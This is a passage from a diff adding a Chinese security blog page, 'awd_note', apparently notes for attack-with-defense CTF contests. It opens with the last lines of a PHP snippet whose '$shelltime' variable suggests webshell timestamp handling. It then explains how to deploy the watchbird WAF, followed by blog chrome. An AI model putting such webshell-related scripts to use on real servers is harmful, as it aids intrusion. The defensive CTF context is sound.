class="hljs-variable">$shelltime</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$file2</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="二-Defense"><a href="#二-Defense" class="headerlink" title="二.Defense"></a>二.Defense</h2><h3 id="1-waf部署"><a href="#1-waf部署" class="headerlink" title="1.waf部署"></a>1.waf部署</h3><ul>
+<li>上传<code>waf.so</code>和<code>watchbird.php</code>文件存放在<code>/var/www/html</code>或其他目录中</li>
+<li>安装：低权限<code>www-data</code>即可执行<code>php watchbird.php --install /var/www/html</code></li>
+<li>启用：访问任意启用了waf的文件, 参数<code>?watchbird=ui</code>打开watchbird控制台, 创建一个初始密码</li>
+<li>卸载：低权限<code>www-data</code>即可执行<code>php watchbird.php --uninstall /var/www/html</code></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/note/" class="category-chain-item">note</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>awd_note</div>
+      <div>https://k3rwin.github.io/2023/11/13/awd-note/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>k3rwin</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月13日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年11月20日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/04/07/tips/" title="tips">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">tips</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E7%9A%84%E5%BA%94%E6%80%A5%E5%B9%B6%E6%BA%AF%E6%BA%90%E7%BA%A2%E9%98%9F%E8%BA%AB%E4%BB%BD/" title="记一次成功的应急并溯源红队身份">
+                        <span class="hidden-mobile">记一次成功的应急并溯源红队身份</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'https://k3rwin.github.io/2023/11/13/awd-note/';
+          this.page.identifier = '/2023/11/13/awd-note/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'k3rwin-github-io' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> with <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
